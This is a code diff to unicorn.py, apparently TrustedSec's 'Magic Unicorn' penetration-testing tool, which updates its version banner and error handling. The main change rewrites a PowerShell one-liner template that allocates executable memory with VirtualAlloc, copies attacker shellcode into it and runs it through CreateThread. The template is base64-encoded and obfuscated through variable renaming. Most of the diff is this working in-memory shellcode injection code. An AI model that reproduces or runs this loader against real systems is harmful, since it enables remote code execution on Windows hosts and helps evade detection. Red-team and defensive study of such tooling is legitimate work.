@@ -443,7 +443,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.2.10 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.3.1 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -947,13 +947,13 @@ def gen_shellcode_attack(payload, ipaddr, port):
     msv = mangle_word("msvcrt.dll")
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r'''$1='$t=''[DllImport("%s")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w=Add-Type -memberDefinition $t -Name "%s" -namespace Win32Functions -passthru;[Byte[]]$z=%s;$g=0x$randstack;if ($z.Length -gt 0x$randstack){$g=$z.Length};$x=$w::VirtualAlloc(0,0x$randstack,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2="powershell";$4="Windows";if([IntPtr]::Size -eq 8){$3="C:\$4\syswow64\$4$2\v1.0\$2";};iex "& $3 -e''c $h"''' % (kernel,kernel,msv,randomize_service_name,shellcode))
+    powershell_code = (r'''$1111='$tttt=''[DllImport("%s")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$wwww=Add-Type -memberDefinition $tttt -Name "%s" -namespace Win32Functions -passthru;[Byte[]]$zzzz=%s;$gggg=0x$randstack;if ($zzzz.Length -gt 0x$randstack){$gggg=$zzzz.Length};$xxxx=$wwww::VirtualAlloc(0,0x$randstack,$gggg,0x40);for ($iiii=0;$iiii -le ($zzzz.Length-1);$iiii++) {$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::CreateThread(0,0,$xxxx,0,0,0);for (;){Start-Sleep 60};';$hhhh=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";if([IntPtr]::Size -eq 8){$3333="C:\$4444\syswow64\$4444$2222\v1.0\$2222";iex "& $3333 -e''c $hhhh"}''' % (kernel,kernel,msv,randomize_service_name,shellcode))
 
     # run it through a lame var replace
-    powershell_code = powershell_code.replace("$1", var1).replace("$c", var2).replace(
-        "$2", var3).replace("$3", var4).replace("$x", var5).replace("$t", var6).replace(
-        "$h", var7).replace("$z", var8).replace("$g", var9).replace("$i", var10).replace(
-        "$w", var11).replace("$randstack", var12).replace("$4", var13)
+    powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
+        "$2222", var3).replace("$3333", var4).replace("$xxxx", var5).replace("$tttt", var6).replace(
+        "$hhhh", var7).replace("$zzzz", var8).replace("$gggg", var9).replace("$iiii", var10).replace(
+        "$wwww", var11).replace("$randstack", var12).replace("$4444", var13)
 
     return powershell_code
 
@@ -1306,8 +1306,6 @@ except KeyboardInterrupt:
     print("\nExiting Unicorn... May the magical unicorn force flow through you.\n")
     sys.exit()
 
-#except Exception as e:
-#    if "list index" in str(e): 
-#        print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python unicorn.py for all usage.")
-#    else:   
-#        print("[!] Something went wrong, printing the error: " + str(e))
+except Exception as e:
+    if "list index" in str(e): print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python unicorn.py for all usage.")
+    else: print("[!] Something went wrong, printing the error: " + str(e))
